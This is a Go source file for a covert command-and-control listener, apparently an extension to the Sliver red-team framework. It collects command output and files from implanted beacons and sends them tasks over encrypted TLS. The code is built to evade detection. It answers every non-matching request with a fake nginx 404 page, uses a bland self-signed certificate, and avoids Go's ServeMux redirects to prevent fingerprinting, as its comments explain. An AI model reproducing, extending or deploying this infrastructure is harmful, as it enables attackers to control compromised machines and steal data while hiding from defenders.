package litebeacon

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/bishopfox/sliver/server/assets"
)

const (
	// DefaultPath is the innocuous check-in endpoint path.
	DefaultPath = "/api/v2/sync"
	maxBodyLen  = 4 << 20
)

// nginxCoverPage mimics a stock nginx "not found" response so the port looks
// like an ordinary web server to anyone probing it.
const nginxCoverPage = `<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
`

type ListenerConfig struct {
	Host string
	Port int
	Path string
}

type Listener struct {
	store   *Store
	secrets *SecretRegistry
	path    string
	server  *http.Server
	ln      net.Listener
}

func (l *Listener) Addr() net.Addr { return l.ln.Addr() }

// Start binds the TLS listener. The certificate is a boring self-signed pair
// stored under ~/.sliver/litebeacon — intentionally not the Sliver cert CA.
func Start(cfg ListenerConfig, store *Store, secrets *SecretRegistry) (*Listener, error) {
	path := cfg.Path
	if path == "" {
		path = DefaultPath
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	certPEM, keyPEM, err := ensureTLSCert()
	if err != nil {
		return nil, err
	}
	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, err
	}
	l := &Listener{store: store, secrets: secrets, path: path}
	// 不用 ServeMux：mux 对未清洗路径在进 handler 前回 301，
	// 绕过 nginx 封面，是指纹口子
	l.server = &http.Server{
		Handler:           http.HandlerFunc(l.handler),
		ReadHeaderTimeout: 15 * time.Second,
		TLSConfig:         &tls.Config{Certificates: []tls.Certificate{cert}},
	}
	ln, err := net.Listen("tcp", net.JoinHostPort(cfg.Host, fmt.Sprint(cfg.Port)))
	if err != nil {
		return nil, err
	}
	l.ln = ln
	go func() {
		_ = l.server.ServeTLS(ln, "", "")
	}()
	return l, nil
}

func (l *Listener) Stop() error {
	return l.server.Close()
}

func (l *Listener) notFound(w http.ResponseWriter) {
	w.Header().Set("Server", "nginx")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusNotFound)
	_, _ = w.Write([]byte(nginxCoverPage))
}

func (l *Listener) handler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost || r.URL.Path != l.path {
		l.notFound(w)
		return
	}
	if r.ContentLength > maxBodyLen {
		l.notFound(w)
		return
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, maxBodyLen))
	if err != nil {
		l.notFound(w)
		return
	}
	plain, matched, nonce, err := openBody(body, l.secrets.Entries())
	if err != nil {
		l.notFound(w)
		return
	}
	ci, err := parseCheckin(plain)
	if err != nil {
		l.notFound(w)
		return
	}
	now := time.Now()
	skew := now.Sub(time.Unix(int64(ci.TS), 0))
	if skew > maxClockSkew || skew < -maxClockSkew {
		l.notFound(w)
		return
	}
	if l.store.Touch(ci.BeaconID, nonce, ci.Info, matched.SecretB64, now) {
		l.notFound(w) // replay
		return
	}
	l.store.PushResults(ci.BeaconID, ci.Execs, ci.Files, now)
	tasks := l.store.TakeTasks(ci.BeaconID)
	for _, task := range tasks {
		if task.Type == TaskExit {
			defer l.store.Delete(ci.BeaconID)
		}
	}
	payload, err := buildTaskPayload(tasks, 1+int(randomBytes(1)[0]))
	if err != nil {
		l.notFound(w)
		return
	}
	respBody, err := sealBody(matched.KeyName, deriveKey(mustSecretBytes(matched.SecretB64)), payload)
	if err != nil {
		l.notFound(w)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(respBody)
}

func mustSecretBytes(secretB64 string) []byte {
	secret, err := base64.StdEncoding.DecodeString(secretB64)
	if err != nil || len(secret) != 32 {
		return make([]byte, 32)
	}
	return secret
}

func tlsCertPaths() (string, string) {
	dir := filepath.Join(assets.GetRootAppDir(), "litebeacon")
	return filepath.Join(dir, "tls.pem"), filepath.Join(dir, "tls.key")
}

// ensureTLSCert loads or creates a plain self-signed cert. Boring subject on
// purpose: no Sliver subject randomization fingerprints.
func ensureTLSCert() (certPEM, keyPEM []byte, err error) {
	certPath, keyPath := tlsCertPaths()
	if cert, cerr := os.ReadFile(certPath); cerr == nil {
		if key, kerr := os.ReadFile(keyPath); kerr == nil {
			return cert, key, nil
		}
	}
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, err
	}
	tmpl := x509.Certificate{
		SerialNumber: big.NewInt(time.Now().Unix()),
		Subject:      pkix.Name{CommonName: "www", Organization: []string{"web"}},
		NotBefore:    time.Now().Add(-24 * time.Hour),
		NotAfter:     time.Now().Add(10 * 365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	der, err := x509.CreateCertificate(rand.Reader, &tmpl, &tmpl, &priv.PublicKey, priv)
	if err != nil {
		return nil, nil, err
	}
	certPEM = pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	keyPEM = pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	if err := os.MkdirAll(filepath.Dir(certPath), 0o700); err != nil {
		return nil, nil, err
	}
	if err := os.WriteFile(certPath, certPEM, 0o600); err != nil {
		return nil, nil, err
	}
	if err := os.WriteFile(keyPath, keyPEM, 0o600); err != nil {
		return nil, nil, err
	}
	return certPEM, keyPEM, nil
}
